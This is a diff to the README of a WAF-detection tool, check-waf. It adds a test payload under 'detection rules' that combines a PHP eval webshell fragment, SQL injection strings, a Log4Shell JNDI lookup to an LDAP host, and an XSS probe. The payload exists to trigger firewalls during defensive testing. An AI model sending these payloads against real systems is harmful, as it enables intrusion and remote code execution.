@@ -9,3 +9,4 @@ python3 check-waf.py urls.txt
 
 ## 检测规则
 ![image](https://github.com/Huck-Lin/check-waf/assets/36686730/71592190-eefe-49f0-903f-9766ed73604c)
+payload：`?a=<%3fphp+%40eval($_GET['cmd'])%3b%3f>%26b%3d1'+or+'1'%3d'1&c=${jndi%3aldap%3a//10.0.0.1%3a8080/Exploit}&s=<script>alert(1)</script>&id=UNION+SELECT+ALL+FROM+information_schema+AND+'+or+SLEEP(5)+or+'`
